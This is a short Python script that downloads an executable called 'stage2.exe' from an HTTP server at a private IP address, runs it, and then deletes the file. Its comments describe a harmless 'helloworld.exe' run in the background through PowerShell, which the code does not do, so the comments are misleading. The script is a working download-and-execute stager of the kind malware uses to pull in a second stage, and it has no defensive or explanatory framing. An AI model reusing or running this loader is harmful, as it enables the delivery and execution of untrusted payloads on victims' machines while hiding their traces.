import subprocess
import requests
import os
import tempfile
import time 

def download_file(url, dest_folder):
    # Extract filename from URL
    filename = url.split('/')[-1]
    
    # Define destination path
    dest_path = os.path.join(dest_folder, filename)
    
    # Download the file
    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(dest_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
    return dest_path

def run_exe_in_background(exe_path):
    # Command to run helloworld.exe in a new PowerShell terminal in the background
    command = f'{exe_path}'
    # Execute the command
    subprocess.run(command, shell=False)

if __name__ == "__main__":
    # URL to download the helloworld.exe file
    exe_url = 'http://192.168.207.128:8000/stage2.exe'
    
    # Temporary directory to store the downloaded file
    temp_dir = tempfile.mkdtemp()
    
    try:
        # Download the helloworld.exe file
        exe_path = download_file(exe_url, temp_dir)
        
        # Execute the helloworld.exe in the background
        run_exe_in_background(exe_path)
    finally:
        # Delete the downloaded file
        os.remove(exe_path)
        # Remove the temporary directory
        os.rmdir(temp_dir)
